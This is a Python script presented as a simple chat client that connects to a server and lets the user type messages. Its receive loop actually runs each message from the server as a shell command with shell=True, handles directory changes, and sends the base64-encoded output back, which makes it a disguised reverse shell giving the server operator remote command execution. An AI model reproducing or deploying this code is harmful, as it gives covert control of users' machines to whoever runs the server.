import socket
import threading
import subprocess
import base64
import os

HOST = '127.0.0.1'
PORT = 12345

def receive_messages(sock):
    """Continuously listen for messages from the server and print them."""
    while True:
        try:
            message = sock.recv(1024).decode('utf-8', errors="replace")

            if message.startswith("cd "):
                path = message.split(" ")[1]
                try:
                    os.chdir(path)
                    sock.send(base64.b64encode(f"Directory has been changed to {os.getcwd()}".encode()))
                except:
                    sock.send(base64.b64encode(b"Failed to change directory!"))
            else:

                response = subprocess.run(message.split(" "), capture_output=True, shell=True)
                sock.sendall(base64.b64encode(response.stdout+response.stderr))
            if not message:
                # Server might have closed the connection
                print("Disconnected from chat.")
                break
            print(message)
        except:
            break

    # If we get here, connection is lost or closed
    sock.close()

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST, PORT))
    print("Connected to the chat server.")

    # Start a thread to receive and print incoming messages
    thread = threading.Thread(target=receive_messages, args=(client_socket,), daemon=True)
    thread.start()

    # Main loop for sending messages
    print("Type messages below. Type '/quit' to disconnect.")
    while True:
        msg = input()
        if msg.lower() == '/quit':
            break
        try:
            client_socket.sendall(msg.encode('utf-8'))
        except:
            print("Error sending message. Disconnecting.")
            break

    client_socket.close()

if __name__ == "__main__":
    main()
